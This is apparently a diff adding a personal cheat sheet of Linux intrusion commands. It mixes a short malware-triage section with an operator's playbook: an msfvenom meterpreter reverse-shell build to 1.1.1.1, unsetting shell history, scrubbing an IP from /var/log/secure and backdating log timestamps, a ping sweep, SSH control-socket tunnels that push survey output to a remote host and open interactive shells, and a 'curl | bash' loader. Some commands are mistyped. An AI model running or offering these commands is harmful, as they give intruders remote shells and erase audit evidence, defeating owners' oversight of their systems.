@@ -1,0 +1,97 @@
+Other pastables
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=443 -f elf > payload_elf
+
+************* Malware Traige ************
+ps -elf				#What is the parent process?
+netstat -natup			# IS it network aware?
+lsof -Pnp <PID>			#lists open files, Shared Objects(Libraries), network connections for a process, is it logging to a file?
+stat </file>			#lists time stamps on a file, When was it writen to disk?
+ldd </file>			#displays shared objects
+echo $LD_PRELOAD		#look for odd preload files
+cat /proc/$PID/environ		#long list that shows PRELOAD files
+find / -newermt 2017-12-25 ! -newermt 2017-12-26	#search for additonal files based on time
+md5sum bad.file			#Hash the file
+scp user@ip:/path ./bad		#download file
+strings bad.file		#shows what the applicaiton is doing
+grep -r -i -H 127.0.0.1 /etc	#recusivly searches everything under /etc for 127.0.0.1, used to find persistanance
+cat /proc/modules		# lists loaded kernel modules
+cat /etc/crontab
+ls -al /etc/cron*
+crontab -l
+for user in $(cat /etc/passwd | egrep '/bin/sh|/bin/bash' | cut -d \: -f1); do "crontab -l -u $user"; done
+ls -lart /tmp
+cat /etc/rc.local
+ls -latr /proc/<pid>/fd
+
+ 
+
+************ Mando ***********
+unset HISTFILE HISTFILESIZE HISTSIZE
+date
+df -h
+ps -elf
+netstat -natup
+ls -latr /var/log
+uname -a
+w
+cat /etc/*relese*
+env
+/bin/bash -ic 'alias -p'
+ip a
+lastlog
+service --status-all || systemctl -t service --no-pager
+arp- vn
+route -n
+cat /etc/passwd
+if [[ $(/sbin/getenforce 2>/dev/null) ]]; then eval /sbin/getenforce; else echo "No SELinux"; fi
+if [[ $(lsmod | grep -i table) ]]; then eval iptables -L; else echo "No IPTables"; fi
+
+
+************* Cleaning Logs ****************
+egrep -v "1.1.1.1" /var/log/secure > .new
+cat .new > /var/log/secure
+tail -1 /var/log/secure
+touch -r /var/log/lastlog /var/log/secure
+rm -f .new
+OR
+wc -l /var/log/auth.log
+head -[count -badlogs] /var/log/auth.log > .new
+touch -t yymmddhhmm /var/log/auth.log
+rm -f .new
+
+
+************ Exit off Box ******************
+find / -type -f -mmin -60 2>/dev/null | -path /sys -prune -o -path /proc -prune -o -type d
+ps -elf
+netstat -natup
+
+
+*************** PING Sweep ***************
+for i in `seq 1 255`; do ping -c 1 192.168.1.$i | tr \\n ' ' | awk '/1 received/ {print $2}'; done
+
+
+*************** SSH Connections ****************
+ssh -M -f -N -o ControlPath=/tmp/ssh user@host
+
+ssh -S /tmp/ssh -O exit user@host
+
+
+./survey.sh | ssh -v -x -M -S /tmp/@r user@1.1.1.1 > survey.out
+ssh -v -x -O forward -S /tmp/@r user@1.1.1.1 /bin/bash -i
+ssh -v -x -O forward -S /tmp/@r 127.0.0.1@fake -L80:2.2.2.2:80
+ssh -v -x -O forward -S /tmp/@r 127.0.0.1@fake -R 443:127.0.0.1:443
+
+kill -9 <pid of SSh Session>
+
+ssh -v -x -O cancel -S /tmp/@r 127.0.0.1@fake -R 443:127.0.0.1:443  #removes ssh tunnel
+
+*************** IPTables redirection ****************
+on Proxy:
+sysctl net.ipv4.ip_forwrad=1
+iptables -t nat -A PREROUTING -src <sourceip> -p tcp -j DNAT --to-destination <targetip>
+iptables -t nat -A POSTROUTING -j MASQUERADE
+
+
+*************** Other ****************
+curl | bash 		#load script from web to memory 
